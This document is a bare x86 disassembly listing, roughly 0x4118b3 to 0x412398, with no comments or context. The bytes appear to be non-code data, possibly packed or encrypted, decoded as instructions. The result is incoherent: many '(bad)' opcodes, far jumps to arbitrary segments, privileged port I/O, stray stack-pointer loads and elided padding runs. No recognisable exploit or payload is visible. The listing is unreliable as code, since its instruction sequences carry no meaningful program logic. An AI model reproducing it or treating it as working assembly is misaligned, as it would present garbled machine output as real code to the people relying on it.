  4118b3:	or     DWORD PTR [ebx-0x4437557c],0xaf06bffe
  4118bd:	imul   BYTE PTR [ecx+0x3e02aad0]
  4118c3:	jb     0x4118f9
  4118c5:	or     al,BYTE PTR [ecx-0x6e09510a]
  4118cb:	call   0x727f1b7a
  4118d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118d1:	sbb    DWORD PTR [ecx+0x70af745a],eax
  4118d7:	pop    edi
  4118d8:	pop    ebp
  4118d9:	mov    esp,0xbc5d6eaa
  4118de:	push   0x68ab935f
  4118e3:	pop    edi
  4118e4:	inc    ebp
  4118e5:	mov    esp,0x3b5152d2
  4118ea:	push   edx
  4118eb:	pop    edi
  4118ec:	xor    eax,0x356e8a80
  4118f1:	mov    esp,0xde9c5a40
  4118f6:	cmp    BYTE PTR [ecx+0x5f30b40c],ch
  4118fc:	add    BYTE PTR [eax-0x43f2a169],bl
  411902:	jmp    0x5874:0x18bbfd6f
  411909:	sub    DWORD PTR [ecx],edx
  41190b:	pop    edi
  41190c:	cmc    
  41190d:	jne    0x411930
  41190f:	addr16 in eax,dx
  411911:	mov    ebx,0xabf0e900
	...
  41193e:	add    BYTE PTR [eax],al
  411940:	fstp   QWORD PTR [ebp-0x23]
  411943:	mov    ebx,0xb3c0a8f0
  411948:	call   0x5474d9ab
  41194d:	pop    esi
  41194e:	lds    edi,FWORD PTR [ebx-0x40309c7e]
  411954:	rcr    DWORD PTR [esi-0x4b],cl
  411957:	mov    ebx,0x97c05f52
  41195c:	imul   ebx,DWORD PTR [ebx-0x17],0xffffffcc
  411960:	jg     0x4119b5
  411962:	jmp    0x69b0deb7
  411967:	shl    BYTE PTR [ebp+0x6e2de8f1],0x5e
  41196e:	sti    
  41196f:	or     esp,DWORD PTR [esi-0x6f44fa2c]
  411975:	aam    0xff
  411977:	sub    eax,esi
  411979:	test   BYTE PTR [edi],0x5
  41197c:	sti    
  41197d:	pop    edx
  41197e:	(bad)  
  41197f:	fadd   QWORD PTR [ebp+0x73]
  411982:	mov    ds:0xfe5db55f,al
  411987:	fdiv   QWORD PTR [ecx-0x6a1e8ba3]
  41198d:	stos   BYTE PTR es:[edi],al
  41198e:	inc    si
  411990:	xchg   ebp,eax
  411991:	xchg   ebx,eax
  411992:	shl    ebp,0x3d
  411995:	or     BYTE PTR [ebx-0x4653ebb],cl
  41199b:	xchg   edi,eax
  41199c:	in     al,dx
  41199d:	lock call DWORD PTR [edx-0xe8ba2ce]
	...
  4119cc:	add    BYTE PTR [eax],al
  4119ce:	in     eax,0x7
  4119d0:	addr16 push ss
  4119d2:	in     eax,0xd2
  4119d4:	inc    esp
  4119d5:	or     eax,0xb15926b1
  4119da:	sbb    BYTE PTR [ebx-0x75],0xbc
  4119de:	jbe    0x4119f3
  4119e0:	inc    ecx
  4119e1:	jmp    0x754136a3
  4119e6:	jle    0x4119db
  4119e8:	mov    eax,0x575b834d
  4119ed:	shr    DWORD PTR [eax],1
  4119ef:	add    eax,0x9b38e900
  4119f4:	jae    0x4119e4
  4119f6:	(bad)  
  4119f7:	jae    0x4119bf
  4119f9:	cmp    dl,BYTE PTR [ebp+0x3a514f5c]
  4119ff:	pop    ebx
  411a00:	out    dx,eax
  411a01:	ja     0x411a18
  411a03:	call   0x1cff:0xb3a2863
  411a0a:	dec    edx
  411a0b:	jae    0x4119df
  411a0d:	jnp    0x411a03
  411a0f:	pop    esp
  411a10:	out    0xb5,eax
  411a12:	pop    edx
  411a13:	pop    esi
  411a14:	inc    BYTE PTR [edx+0x80153a]
  411a1a:	sbb    DWORD PTR [ecx+0x75],0x31a359fa
  411a21:	ror    BYTE PTR [esi-0x5f],0xfd
  411a25:	call   DWORD PTR [eax]
  411a27:	test   al,0xac
  411a29:	cmp    BYTE PTR [eax+0x2a],ch
  411a2c:	mov    ebx,0xfda58aff
  411a31:	jne    0x411a33
	...
  411a5b:	add    BYTE PTR [edi-0x4f],bl
  411a5e:	addr16 lock mov al,ss:0x5e5d
  411a64:	push   cs
  411a65:	cwde   
  411a66:	add    al,BYTE PTR [eax]
  411a68:	stos   BYTE PTR es:[edi],al
  411a69:	int3   
  411a6a:	jmp    0x9ac7:0x51a21b83
  411a71:	mov    eax,ds:0x5927fffe
  411a76:	mov    DWORD PTR [ebp+0x53],0x17000058
  411a7d:	into   
  411a7e:	inc    ebx
  411a7f:	or     al,0x94
  411a81:	pusha  
  411a82:	(bad)  
  411a83:	je     0x411a93
  411a85:	outs   dx,BYTE PTR ds:[esi]
  411a86:	mov    esi,0xc8fd352b
  411a8b:	ret    0x5923
  411a8e:	mov    ebx,0x591701
  411a93:	jmp    0x411a1b
  411a95:	(bad)  
  411a96:	jnp    0x411aa8
  411a98:	out    0x2c,eax
  411a9a:	add    eax,0x89471a8b
  411a9f:	sbb    al,dh
  411aa1:	sub    al,0xc
  411aa3:	call   FWORD PTR [edx]
  411aa5:	dec    edi
  411aa6:	call   0xfde39621
  411aab:	or     DWORD PTR [eax+edx*2+0x1dde0575],0xfffffff8
  411ab3:	jmp    0x411b1e
  411ab5:	pop    es
  411ab6:	and    eax,0xfda2d07f
  411abb:	or     DWORD PTR [esi],edi
  411abd:	das    
  411abe:	mov    esp,0x57
	...
  411ae7:	add    BYTE PTR [eax],al
  411ae9:	add    bh,dl
  411aeb:	repnz add eax,DWORD PTR [eax]
  411aee:	ds pop edi
  411af0:	add    al,0xeb
  411af2:	dec    ebp
  411af3:	icebp  
  411af4:	mov    esp,0x8b7f1307
  411af9:	inc    esp
  411afa:	xchg   cl,bh
  411afc:	dec    esi
  411afd:	cld    
  411afe:	dec    ecx
  411aff:	into   
  411b00:	lds    eax,FWORD PTR [edi]
  411b02:	jg     0x411b16
  411b04:	or     al,0x89
  411b06:	add    ecx,DWORD PTR [edx]
  411b08:	mov    edx,DWORD PTR [edx+eiz*2+0x19]
  411b0c:	adc    eax,0x8d1a038b
  411b11:	push   esp
  411b12:	push   edx
  411b13:	ins    DWORD PTR es:[edi],dx
  411b14:	pop    esi
  411b15:	rol    DWORD PTR [ecx+0x33],0xa4
  411b19:	push   es
  411b1a:	mov    bh,0xb7
  411b1c:	mov    edx,0x45369388
  411b21:	xor    DWORD PTR ds:0xb59a306b,0xffffffae
  411b28:	push   es
  411b29:	and    DWORD PTR [esi+0x72],0x2d
  411b2d:	push   es
  411b2e:	gs xor ch,ch
  411b31:	shl    DWORD PTR ds:0x6448b74,1
  411b37:	stc    
  411b38:	dec    esi
  411b39:	cld    
  411b3a:	gs cmp eax,esi
  411b3d:	or     edi,DWORD PTR [esi]
  411b3f:	pop    ds
  411b40:	(bad)  
  411b41:	jmp    0x411b00
  411b43:	mov    ch,0xae
  411b45:	mov    al,ds:0x41f3d2
  411b4a:	daa    
  411b4b:	aaa    
  411b4c:	or     BYTE PTR [esi+0x0],dh
	...
  411b77:	add    BYTE PTR [eax+0x49],al
  411b7a:	(bad)  
  411b7b:	enter  0x81fc,0x2
  411b7f:	call   DWORD PTR [ebx]
  411b81:	dec    BYTE PTR [eax-0x4765c1c0]
  411b87:	addr16 mov ecx,0xfa8aa65a
  411b8d:	bound  ebp,QWORD PTR [ebx+0x3e]
  411b90:	stos   BYTE PTR es:[edi],al
  411b91:	or     al,BYTE PTR [ecx-0x72a3fe04]
  411b97:	mov    eax,0x2e864712
  411b9c:	inc    edx
  411b9d:	pop    esp
  411b9e:	repz mov ebx,0xabe0e588
  411ba4:	icebp  
  411ba5:	imul   DWORD PTR [ebp-0x48]
  411ba8:	inc    esp
  411ba9:	fwait
  411baa:	cmc    
  411bab:	jg     0x411b48
  411bad:	pop    edx
  411bae:	jmp    0xe52684b6
  411bb3:	mov    eax,0x2e4d62ea
  411bb8:	pop    edx
  411bb9:	jb     0x411c17
  411bbb:	and    dl,BYTE PTR [ecx+0x5b]
  411bbe:	jno    0x411bfe
  411bc0:	cmp    ah,BYTE PTR [eax]
  411bc2:	lods   al,BYTE PTR ds:[esi]
  411bc3:	adc    esi,DWORD PTR [ecx]
  411bc5:	fadd   DWORD PTR [ebx+eax*1+0x2e265b3e]
  411bcc:	dec    edx
  411bcd:	pop    edx
  411bce:	xchg   ebp,eax
  411bcf:	or     edx,DWORD PTR [esi]
  411bd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bd2:	mov    bh,BYTE PTR [eax-0x505b1ae0]
  411bd8:	and    al,0xd0
  411bda:	push   es
  411bdb:	inc    esi
	...
  411c04:	add    BYTE PTR [eax],al
  411c06:	or     al,BYTE PTR [edi+0x4f828c19]
  411c0c:	(bad)  
  411c0d:	(bad)  [ebp+0x4503a8e9]
  411c13:	sub    eax,0xc3e5025c
  411c18:	push   ecx
  411c19:	add    al,0x8e
  411c1b:	pop    edx
  411c1c:	pop    ebp
  411c1d:	or     al,0xd6
  411c1f:	ja     0x411c68
  411c21:	mov    bh,0xd8
  411c23:	pop    edx
  411c24:	cmp    eax,0xefd0d110
  411c29:	stos   DWORD PTR es:[edi],eax
  411c2a:	daa    
  411c2b:	mov    esi,0xe589b600
  411c30:	push   ebx
  411c31:	aad    0xbc
  411c33:	xchg   esp,eax
  411c34:	add    BYTE PTR [esp+edi*1],bl
  411c37:	inc    esi
  411c38:	dec    ecx
  411c39:	jo     0x411c3a
  411c3b:	dec    esi
  411c3c:	mov    ah,ah
  411c3e:	mov    cl,0xe8
  411c40:	aas    
  411c41:	jmp    0x18466002
  411c46:	leave  
  411c47:	iret   
  411c48:	adc    al,0x18
  411c4a:	ror    edi,1
  411c4c:	clc    
  411c4d:	jbe    0x411c9e
  411c4f:	arpl   ax,bp
  411c51:	lahf   
  411c52:	sbb    al,0x5a
  411c54:	inc    al
  411c56:	inc    esp
  411c57:	sbb    esi,DWORD PTR [ebx+ebp*8-0x6c]
  411c5b:	jg     0x411cac
  411c5d:	push   esi
  411c5e:	das    
  411c5f:	push   ebx
  411c60:	(bad)  
  411c61:	aam    0x91
  411c63:	inc    edx
  411c64:	adc    al,0xc8
  411c66:	mov    BYTE PTR [ecx-0x2],bl
  411c69:	mov    ah,0x0
	...
  411c93:	add    BYTE PTR [ecx-0x7736f7be],dl
  411c99:	pop    ecx
  411c9a:	cmp    al,0xe9
  411c9c:	cmp    eax,0x3f9f069b
  411ca1:	inc    esi
  411ca2:	or     DWORD PTR [edx+0x67],ebp
  411ca5:	dec    edi
  411ca6:	add    DWORD PTR [ebx+eiz*4+0x4f0e1945],ebx
  411cad:	push   edi
  411cae:	jmp    0xfe9b860d
  411cb3:	es jg  0x411d0d
  411cb6:	add    ecx,ebp
  411cb8:	cmp    eax,0x49a4895b
  411cbd:	and    al,BYTE PTR [ecx]
  411cbf:	jmp    0xde417801
  411cc4:	cs push ebx
  411cc6:	jmp    0xfe9b5da0
  411ccb:	bound  edi,QWORD PTR [esi+0x57]
  411cce:	enter  0xa500,0x6d
  411cd2:	add    BYTE PTR [ebp+0x4c],dl
  411cd5:	add    dl,BYTE PTR [edi-0x75]
  411cd8:	adc    ah,BYTE PTR [ebx-0x7f]
  411cdb:	rcr    BYTE PTR [edi+0x40fce8ad],0x12
  411ce2:	dec    DWORD PTR [ebx+0xc7510df]
  411ce8:	sbb    BYTE PTR [ecx-0x1],bl
  411ceb:	jne    0x411c84
  411ced:	loopne 0x411d35
  411cef:	add    al,0x24
  411cf1:	xchg   ebx,eax
  411cf2:	or     al,0x0
  411cf4:	xchg   ebx,eax
  411cf5:	pusha  
  411cf6:	std    
  411cf7:	jne    0x411cf9
	...
  411d21:	add    BYTE PTR [ebx+0x570846e2],bl
  411d27:	adc    dh,BYTE PTR [ebp+0x8]
  411d2a:	movq   mm5,QWORD PTR [eax-0x1]
  411d2e:	or     ch,ah
  411d30:	inc    esp
  411d31:	adc    al,0xde
  411d33:	push   ebp
  411d34:	mov    dh,0x1
  411d36:	addr16 pop ebp
  411d38:	add    BYTE PTR [edi+0xe],bl
  411d3b:	sbb    al,0xe
  411d3d:	add    BYTE PTR [edx+0x1383e9e4],dh
  411d43:	or     cl,BYTE PTR [ebx+0x1a1355]
  411d49:	add    BYTE PTR [edi],ah
  411d4b:	pop    ebp
  411d4c:	add    BYTE PTR [ebx],ch
  411d4e:	or     DWORD PTR gs:[ebp+0xc],eax
  411d52:	push   ss
  411d53:	pop    ebp
  411d54:	add    BYTE PTR [eax],al
  411d56:	clc    
  411d57:	call   0x60fba11b
  411d5c:	add    BYTE PTR [ebp-0x1c],dh
  411d5f:	adc    DWORD PTR [ebp+0x14],esi
  411d62:	mov    ebp,0xbd006a5d
  411d67:	pop    esp
  411d68:	call   0xff4ff5fd
  411d6d:	jmp    0x417ac0
  411d72:	lds    esi,FWORD PTR ds:0xdfaf3f0c
  411d79:	dec    BYTE PTR [ebx+0x32]
  411d7c:	mov    ch,0x74
  411d7e:	sub    dh,BYTE PTR ss:[ecx]
  411d81:	(bad)  
  411d83:	adc    DWORD PTR [edx+0x44],ecx
	...
  411dad:	add    BYTE PTR [eax],al
  411daf:	add    BYTE PTR [edx+0x24142e09],bh
  411db5:	inc    edx
  411db6:	sub    BYTE PTR [ebx+edi*4],al
  411db9:	jg     0x411d73
  411dbb:	dec    edi
  411dbc:	xchg   esi,eax
  411dbd:	imul   esi,DWORD PTR [ebx+0x4db99fe],0x81423e02
  411dc7:	jl     0x411e03
  411dc9:	inc    esp
  411dca:	das    
  411dcb:	and    eax,DWORD PTR [ecx-0xc00eda9]
  411dd1:	cmp    DWORD PTR [edx-0x4c3f23e3],ebp
  411dd7:	mov    BYTE PTR [ebx],al
  411dd9:	mov    dh,0xb3
  411ddb:	je     0x411e27
  411ddd:	sbb    al,0x2
  411ddf:	push   0x42
  411de1:	mov    bh,0x3d
  411de3:	cld    
  411de4:	out    dx,al
  411de5:	test   eax,0x9949fef6
  411dea:	test   eax,0x2423fd6
  411def:	cmp    DWORD PTR [ebx+0x5e750136],0xffffff81
  411df6:	sub    eax,0xb5459410
  411dfb:	je     0x411e33
  411dfd:	pop    edx
  411dfe:	inc    edi
  411dff:	bound  ebx,QWORD PTR [ecx]
  411e01:	imul   esi,DWORD PTR [ebx+0xec2a74],0x1ec3e6a
  411e0b:	call   0xfef66f36
  411e10:	out    0x92,eax
  411e12:	add    DWORD PTR [eax],eax
	...
  411e3c:	add    BYTE PTR [eax],al
  411e3e:	ds pop ebx
  411e40:	push   0x36
  411e42:	cmp    bl,BYTE PTR [edi+0x54]
  411e45:	loope  0x411e27
  411e47:	int    0xf7
  411e49:	mov    ah,0x52
  411e4b:	arpl   WORD PTR [edi-0x38a7a1a0],di
  411e51:	mov    al,BYTE PTR [edx+0x2a2ebf57]
  411e57:	(bad)
  411e5a:	inc    edx
  411e5b:	out    0x24,al
  411e5d:	mov    eax,0xb5974301
  411e62:	test   al,0x57
  411e64:	xchg   ecx,eax
  411e65:	mov    edi,DWORD PTR [esi]
  411e67:	pop    ebx
  411e68:	out    0x80,eax
  411e6a:	sbb    ah,BYTE PTR [edi-0x1c]
  411e6d:	sub    DWORD PTR cs:[eax-0x3],ebx
  411e71:	adc    edx,DWORD PTR [ecx+eiz*2]
  411e74:	jle    0x411ea4
  411e76:	ss inc ebx
  411e78:	je     0x411e9c
  411e7a:	jns    0x411ed3
  411e7c:	xor    BYTE PTR [edx],al
  411e7e:	ds pop ebx
  411e80:	out    0xaa,eax
  411e82:	aam    0x59
  411e84:	out    0x3,eax
  411e86:	mov    ebp,0xd2fde3d5
  411e8b:	jp     0x411edb
  411e8d:	(bad)
  411e92:	shl    BYTE PTR [edx+0x4f],cl
  411e95:	aam    0xde
  411e97:	push   edi
  411e98:	aaa    
  411e99:	mov    ah,0xb2
  411e9b:	outs   dx,DWORD PTR ds:[esi]
  411e9c:	rol    DWORD PTR [eax],0xa4
  411e9f:	pop    ebx
  411ea0:	xchg   ecx,eax
  411ea1:	add    eax,DWORD PTR [eax]
	...
  411ecb:	add    BYTE PTR [esi],dl
  411ecd:	or     BYTE PTR [esi],bl
  411ecf:	mov    ah,0x20
  411ed1:	inc    ebp
  411ed2:	lods   eax,DWORD PTR ds:[esi]
  411ed3:	add    bh,BYTE PTR [esi]
  411ed5:	pop    ebx
  411ed6:	push   0x36
  411ed8:	inc    edx
  411ed9:	pop    esi
  411eda:	jl     0x411ebf
  411edc:	or     cl,dl
  411ede:	xlat   BYTE PTR ds:[ebx]
  411edf:	sub    DWORD PTR [esi],esi
  411ee1:	push   esi
  411ee2:	add    DWORD PTR [ebp+eax*2+0x43],edi
  411ee6:	mov    eax,0xfe55aa88
  411eeb:	pop    esp
  411eec:	inc    esi
  411eed:	rol    DWORD PTR [ecx],0x53
  411ef0:	cmp    al,cl
  411ef2:	add    cl,al
  411ef4:	les    ebx,FWORD PTR [eax-0x2]
  411ef7:	into   
  411ef8:	mov    bl,0x75
  411efa:	(bad)  
  411efb:	call   0xedbcf93d
  411f00:	(bad)
  411f03:	scas   al,BYTE PTR es:[edi]
  411f04:	pop    es
  411f05:	push   edi
  411f06:	add    ecx,ebp
  411f08:	cmp    eax,0x461cfd5b
  411f0d:	rol    DWORD PTR [eax],0x13
  411f10:	ss call 0x4333b459
  411f16:	gs (bad) 
  411f18:	int    0x55
  411f1a:	call   0x9c61a3
  411f1f:	push   0x4f
  411f21:	addr16 pop es
  411f23:	cld    
  411f24:	dec    ecx
  411f25:	push   ds
  411f26:	inc    esp
  411f27:	ins    DWORD PTR es:[edi],dx
  411f28:	cmp    ebx,DWORD PTR [ebx+0x0]
  411f2b:	jmp    0xd355eedc
	...
  411f58:	add    BYTE PTR [eax],al
  411f5a:	cmp    eax,0x76404c1
  411f5f:	push   edi
  411f60:	push   ecx
  411f61:	inc    ecx
  411f62:	clc    
  411f63:	push   esp
  411f64:	inc    BYTE PTR [esi-0x55]
  411f67:	xor    DWORD PTR [ecx],eax
  411f69:	jmp    0xe5bcf9ab
  411f6e:	cmp    ecx,edi
  411f70:	or     dh,BYTE PTR [ecx+0x3a]
  411f73:	pop    ebx
  411f74:	add    cl,ch
  411f76:	retf   0x120
  411f79:	jmp    0xe5bcf9bb
  411f7e:	sbb    bh,cl
  411f80:	or     dl,BYTE PTR [ecx+0x3a]
  411f83:	pop    ebx
  411f84:	add    BYTE PTR [eax],al
  411f86:	pop    ss
  411f87:	idiv   DWORD PTR [edx-0x7ea5e900]
  411f8d:	jge    0x411f72
  411f8f:	push   ebp
  411f90:	jo     0x411fe7
  411f92:	fsubr  QWORD PTR [edi]
  411f94:	jb     0x411fe7
  411f96:	push   esi
  411f97:	mov    ecx,DWORD PTR [eax+eax*1]
  411f9a:	xlat   BYTE PTR ds:[ebx]
  411f9b:	cdq    
  411f9c:	push   es
  411f9d:	jae    0x411fbe
  411f9f:	or     dh,BYTE PTR [ebp+0xc]
  411fa2:	jo     0x411f47
  411fa4:	hlt    
  411fa5:	xor    DWORD PTR [edx+0x13],0xa
  411fa9:	shl    DWORD PTR [edx+0x13],1
  411fac:	push   DWORD PTR [ebp-0x5]
  411faf:	icebp  
  411fb0:	add    BYTE PTR [esi-0x20],ah
  411fb3:	or     BYTE PTR [ecx+0x7508df45],cl
  411fb9:	adc    al,al
  411fbb:	xchg   edx,eax
  411fbc:	hlt    
  411fbd:	inc    DWORD PTR [eax]
	...
  411fe7:	add    BYTE PTR [edx],bh
  411fe9:	pop    es
  411fea:	push   DWORD PTR [ebp-0x61]
  411fed:	icebp  
  411fee:	pop    ecx
  411fef:	pusha  
  411ff0:	ror    BYTE PTR [eax],0xff
  411ff3:	jne    0x412060
  411ff5:	ja     0x411ff9
  411ff7:	(bad)  
  411ff8:	jp     0x412007
  411ffa:	push   DWORD PTR [ebp-0x11]
  411ffd:	icebp  
  411ffe:	sar    ch,1
  412000:	loopne 0x41200a
  412002:	push   DWORD PTR [ebp-0x21]
  412005:	icebp  
  412006:	mov    ebx,0xb608f065
  41200b:	add    DWORD PTR [edi+0x59],esp
  41200e:	add    bl,ch
  412010:	ja     0x411fee
  412012:	jl     0x412020
  412014:	push   edx
  412015:	(bad)  
  412016:	push   ebx
  412017:	or     edx,DWORD PTR [ebp-0x6d]
  41201a:	dec    edi
  41201b:	and    edx,0xd7fffe54
  412021:	bound  esi,QWORD PTR [ecx+0x48]
  412024:	inc    eax
  412025:	xchg   ebx,eax
  412026:	or     al,0x8f
  412028:	ds pop es
  41202a:	mov    dh,0x82
  41202c:	mov    ds:0x9bd1006e,eax
  412031:	push   esi
  412032:	mov    al,0x74
  412034:	or     ch,BYTE PTR [ebx+0x67]
  412037:	fs stc 
  412039:	dec    ebp
  41203a:	jp     0x412080
  41203c:	test   BYTE PTR [ebp+0x36],0x10
  412040:	jmp    0x6c3fd8fc
  412045:	cmp    dh,BYTE PTR [eax+0x21a4674]
  41204b:	pusha  
	...
  412074:	add    BYTE PTR [eax],al
  412076:	shl    DWORD PTR ds:0xa83274b0,1
  41207c:	add    edi,edi
  41207e:	dec    ebx
  41207f:	push   cs
  412080:	mov    al,0x74
  412082:	mov    dh,0x1a
  412084:	cmp    edi,ebp
  412086:	mov    cl,0x5
  412088:	mov    al,0x74
  41208a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41208b:	jmp    0x6c:0xf5a16523
  412092:	ds inc edx
  412094:	add    ch,bl
  412096:	cmp    ebp,DWORD PTR [edx+0x423e0004]
  41209c:	mov    ebx,0x57422ec1
  4120a1:	mov    ebp,DWORD PTR [edx+0x74]
  4120a4:	cmp    DWORD PTR [esi+eax*2+0x42],0x37
  4120a9:	add    eax,0x3c68b08
  4120ae:	ds leave 
  4120b0:	xor    eax,0xb1386508
  4120b5:	xor    eax,0xff256a66
  4120ba:	dec    ecx
  4120bb:	ror    edx,0x3
  4120be:	mov    ebp,0x2f750254
  4120c3:	lea    esi,ds:0x255a2608
  4120c9:	jmp    FWORD PTR [ecx]
  4120cb:	pop    ebx
  4120cc:	lds    edi,FWORD PTR [edx+0x56e75eff]
  4120d2:	lds    eax,FWORD PTR [esi+0x63]
  4120d5:	inc    edi
  4120d6:	inc    esi
  4120d7:	loopne 0x41208d
  4120d9:	inc    DWORD PTR [eax]
	...
  412103:	add    BYTE PTR [esi+ebx*2+0x6b828557],dh
  41210a:	out    0x37,eax
  41210c:	inc    ecx
  41210d:	loopne 0x4120ab
  41210f:	adc    esi,ecx
  412111:	mov    bl,BYTE PTR [esi+0x6]
  412114:	mov    ebp,0x6a03fbd5
  412119:	arpl   WORD PTR [edx+0x56],si
  41211c:	xor    dl,BYTE PTR [eax+ebx*2+0x8]
  412120:	rcr    DWORD PTR [eax+0x6a],0x2e
  412124:	es pop ebx
  412126:	cmp    edi,ebx
  412128:	mov    ah,0xad
  41212a:	fist   WORD PTR [ebx-0x37]
  41212d:	pop    eax
  41212e:	push   0x5
  412130:	inc    esi
  412131:	and    ch,BYTE PTR [edx+0x72ae3e17]
  412137:	lahf   
  412138:	mov    esp,0xf058bc1e
  41213d:	fild   QWORD PTR [esp+edx*1]
  412140:	jns    0x41219c
  412142:	out    0x3,eax
  412144:	ds pop ebx
  412146:	jb     0x41218e
  412148:	xor    bl,BYTE PTR [eax+ebp*8]
  41214b:	add    edi,DWORD PTR [esi]
  41214d:	pop    ebx
  41214e:	out    0x84,eax
  412150:	repnz (bad) 
  412152:	out    0x36,eax
  412154:	and    BYTE PTR ss:[edi],0x51
  412158:	add    DWORD PTR [edx],esp
  41215a:	sub    bh,bh
  41215c:	pop    ecx
  41215d:	push   esp
  41215e:	(bad)  
  412160:	pop    ecx
  412161:	in     eax,dx
  412162:	stos   DWORD PTR es:[edi],eax
  412163:	mov    al,0x48
  412165:	pop    edi
  412166:	daa    
  412167:	add    BYTE PTR ss:[eax],al
	...
  412192:	and    BYTE PTR ss:[edi],0x51
  412196:	cdq    
  412197:	and    al,0x1
  412199:	sub    esi,DWORD PTR [ecx]
  41219b:	push   ebx
  41219c:	mov    DWORD PTR [ebp+edx*8-0x3a0e8baf],esp
  4121a3:	add    eax,0x19ce1e5f
  4121a8:	inc    esp
  4121a9:	sbb    eax,0xe9005b3c
  4121ae:	mov    BYTE PTR [edi-0x687f6614],dl
  4121b4:	hlt    
  4121b5:	cdq    
  4121b6:	scas   al,BYTE PTR es:[edi]
  4121b7:	(bad)  
  4121b8:	or     BYTE PTR [ecx],al
  4121ba:	push   ss
  4121bb:	push   ebp
  4121bc:	(bad)  
  4121bd:	out    dx,al
  4121be:	xlat   BYTE PTR ds:[ebx]
  4121bf:	xchg   edi,eax
  4121c0:	in     al,dx
  4121c1:	pop    esi
  4121c2:	in     al,0xdd
  4121c4:	jnp    0x41219b
  4121c6:	inc    edx
  4121c7:	mov    DWORD PTR [edx+eiz*8],0x208ceef
  4121ce:	add    dh,BYTE PTR [ecx+0x66fcb05d]
  4121d4:	add    BYTE PTR [edx],dl
  4121d6:	pop    es
  4121d7:	aas    
  4121d8:	mov    BYTE PTR [edx+edx*8],ch
  4121db:	fstp   TBYTE PTR [ebx-0x3f]
  4121de:	inc    edx
  4121df:	pop    ebx
  4121e0:	mov    al,ds:0x29636be9
  4121e5:	test   eax,0xabc7b208
  4121ea:	ds pop ebx
  4121ec:	mov    DWORD PTR [edx+ebp*4],esp
  4121ef:	sbb    esp,ecx
  4121f1:	jmp    0x4121e0
  4121f3:	inc    edx
  4121f4:	imul   eax,DWORD PTR ds:0x0,0x0
	...
  41221e:	add    BYTE PTR [eax],al
  412220:	test   eax,0xae2c8851
  412225:	in     eax,0xf8
  412227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412228:	div    DWORD PTR [esi]
  41222a:	add    ecx,ebp
  41222c:	cmp    eax,0xbf1ae95b
  412231:	xchg   edi,eax
  412232:	lock mov ecx,0xb9f497be
  412238:	cwde   
  412239:	(bad)  
  41223a:	or     BYTE PTR [eax],al
  41223c:	out    dx,eax
  41223d:	cmp    edx,0x4cd678ff
  412243:	lock sub al,0x9b
  412246:	call   0xd09645c2
  41224b:	je     0x412274
  41224d:	add    DWORD PTR [ebp-0x4],esi
  412250:	das    
  412251:	bound  esp,QWORD PTR [edi+edi*8+0x28]
  412255:	ss mov esi,0xc00ed85e
  41225b:	or     al,0x17
  41225d:	das    
  41225e:	dec    ebp
  41225f:	call   0xac25c55c
  412264:	fs mov eax,gs
  412267:	add    BYTE PTR [ecx+0x58],dh
  41226a:	cmp    DWORD PTR [ebp+0x3],0x64c1735e
  412271:	mov    ebp,eax
  412273:	add    BYTE PTR [edx+0x59],dh
  412276:	cmp    DWORD PTR [ebp-0xd],0xf810735d
  41227d:	xchg   edx,eax
  41227e:	cld    
  41227f:	call   0x3e9f7b
	...
  4122ac:	add    BYTE PTR [eax],al
  4122ae:	cmp    al,0x17
  4122b0:	pop    esp
  4122b1:	pop    edi
  4122b2:	ficomp WORD PTR [ebx]
  4122b4:	or     al,BYTE PTR [eax]
  4122b6:	adc    al,0x8b
  4122b8:	in     al,0x0
  4122ba:	xor    ah,BYTE PTR [edi+eiz*8-0x75]
  4122be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122bf:	pop    ebp
  4122c0:	add    BYTE PTR [ebx+0x75fd6762],cl
  4122c6:	mov    bl,0xd0
  4122c8:	std    
  4122c9:	mov    ah,BYTE PTR [edx]
  4122cb:	add    eax,ecx
  4122cd:	loopne 0x412334
  4122cf:	lods   eax,DWORD PTR ds:[esi]
  4122d0:	call   0xff4357b5
  4122d5:	mov    DWORD PTR [edx+0x1b7d8b21],edx
  4122db:	aad    0x74
  4122dd:	cld    
  4122de:	ds popf 
  4122e0:	dec    ecx
  4122e1:	lods   eax,DWORD PTR ds:[esi]
  4122e2:	mov    ch,0x93
  4122e4:	mov    BYTE PTR [esi+ebx*2+0x43],0x2
  4122e9:	add    BYTE PTR [esi],bh
  4122eb:	mov    edi,0xb78ee048
  4122f0:	dec    eax
  4122f1:	hlt    
  4122f2:	mov    ?,esp
  4122f4:	scas   al,BYTE PTR es:[edi]
  4122f5:	je     0x41232d
  4122f7:	push   0xffffff9e
  4122f9:	cli    
  4122fa:	sbb    DWORD PTR [edx-0x6],esi
  4122fd:	mov    edi,0x7c83368a
  412302:	adc    al,BYTE PTR [ebx+0x36]
  412305:	push   es
  412306:	mov    ebp,0x72ffa1d7
  41230b:	sbb    BYTE PTR [ebx+0x3642de7c],al
  412311:	or     BYTE PTR [eax],al
	...
  41233b:	add    cl,ch
  41233d:	(bad)  
  41233e:	mov    eax,ds:0xaba5bbe7
  412343:	(bad)  
  412344:	fldenv [edi+0x2824e7d0]
  41234a:	lods   al,BYTE PTR ds:[esi]
  41234b:	dec    cl
  41234d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41234e:	mov    al,0xe7
  412350:	dec    ebx
  412351:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412352:	stos   DWORD PTR es:[edi],eax
  412353:	(bad)  
  412354:	add    cl,BYTE PTR gs:[edi+0x5f]
  412358:	xchg   DWORD PTR [ecx+eax*1],eax
  41235b:	add    BYTE PTR [ebp-0x5e555b89],dh
  412361:	xchg   DWORD PTR [eax+0x4d61b82],ebp
  412367:	je     0x4123a1
  412369:	lds    ebp,FWORD PTR ds:0x90673ef4
  41236f:	mov    bh,bl
  412371:	inc    ebp
  412372:	lods   eax,DWORD PTR ds:[esi]
  412373:	je     0x41230f
  412375:	rol    DWORD PTR [edi+edi*8],0xeb
  412379:	lds    ebx,FWORD PTR [ecx+ecx*2-0x48543f23]
  412380:	aas    
  412381:	pop    ebx
  412382:	out    0x3,eax
  412384:	ds mov cl,0xbe
  412387:	mov    edx,0x56e75f7f
  41238c:	mov    ch,0x3f
  41238e:	imul   ecx,eax,0x79
  412391:	test   al,0x6a
  412393:	das    
  412394:	dec    esi
  412395:	pop    ebx
  412396:	mov    ah,0xf9
  412398:	jmp    0x3e450af6
